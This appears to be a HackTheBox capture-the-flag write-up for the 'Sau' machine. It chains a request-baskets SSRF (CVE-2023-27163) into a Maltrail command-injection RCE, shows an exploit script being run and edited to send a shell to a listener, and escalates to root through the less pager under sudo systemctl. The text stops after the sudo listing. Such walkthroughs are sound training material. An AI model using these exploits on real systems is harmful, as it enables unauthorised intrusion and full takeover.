Normally when I use common scripts with the **-sC** option it will return results from port 80 and 443 about the webpage. Here there is evidently no information being retrieved from whatever is hosted on port 80.

That port 55555 is peculiar however, so I'll try to enumerate its version and go from there.

The page **/web** returns a 200 response which means there is a webserver being hosted on this port.

<h2>request-baskets 1.2.1 SSRF</h2>

Looking around the webpage we can see the version of the service is **request-baskets version 1.2.1**, and in the cursory look for vulnerabilities I found [this SSRF exploit for version 1.2.1](https://github.com/entr0pie/CVE-2023-27163). This should allow me to interact with and enumerate the service on port 80.

That CVE works through an improperly secured **forwarded_url** and **proxy_response** parameter pair which allow server side redirection of traffic and functionally a proxy to relay it back.

<h2>maltrail v0.53 RCE</h2>

Seems to have loaded a bit poorly but the substance is still visible. Namely there is a login button that does not properly work, though I can redirect to **http://localhost:80/login** and check for a response. 

Which we end up not seeing a login page but a response stating a bad request. [Here is an exploit-db post](https://www.exploit-db.com/exploits/51676) which outlines an RCE on this version of maltrails through command injection of the username parameter.


```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Sau]
└──╼ $python3 cve* 10.10.14.3 7777 http://10.10.11.224:55555/undrtk
Running exploit on http://10.10.11.224:55555/undrtk/login
Failed to forward request: Post http://localhost:80/login/login: EOF
```

Oh it looks like the maltrails exploit already appends **/login** to the url, guess I'll comment that out since I already have a basket with **/login**. 


The code I changed:
```
listening_IP = sys.argv[1]
listening_PORT = sys.argv[2]
target_URL = sys.argv[3] # + "/login"
print("Running exploit on " + str(target_URL))
curl_cmd(listening_IP, listening_PORT, target_URL)
```

<h1>Root</h1>

<h2>GTFOBins Less</h2>

After placing an ssh key for a better shell I turned to **sudo -l** as my first check. And the user puma has the ability to run **systemctl status** as sudo. Now systemctl itself with these restrictions prohibits us from creating or running a custom service. 

There is a quirk here to abuse, and that is that systemctl status utilizes the command **less** to display the results. When **less** is run you can gain or change shells within by typing **!/bin/bash**, and while sudo that will give us a root shell.

```bash
puma@sau:~$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
